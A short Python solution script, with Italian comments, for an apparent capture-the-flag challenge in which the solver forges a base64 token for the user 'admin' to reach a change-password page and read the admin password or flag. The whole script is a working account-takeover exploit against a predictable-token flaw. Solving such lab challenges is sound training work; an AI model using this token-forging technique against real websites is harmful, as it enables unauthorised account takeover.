import requests
from bs4 import BeautifulSoup
import base64

# la CTF richiede di cambiare la password di un utente "admin" su un sito web
# tentando con un qualsiasi username, scopriamo a nostro gran favore che: 
    # facendo la POST alla home del sito la risposta è un redirect (302 Found) verso
    # change-password.php?token=(token che appare)
    # compare "Ecco la tua password: (password)"
# il valore (token) è in base64, decodificandolo otteniamo l'username
# il sito usa un token base64 per indicare un utente o un contesto
# quindi possiamo provare a costruire manualmente un link col token per l'admin
# infine basterà visitare il link per avere la password

# codifico admin in base64
token = base64.b64encode(b'admin').decode()
url = f"http://password-changer.challs.olicyber.it/change-password.php?token={token}"
response = requests.get(url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')
    for tag in soup.find_all(string=True):
        if "password" in tag.lower() or "flag" in tag.lower():
            print(tag.strip())
else:
    print("errore ", response.status_code)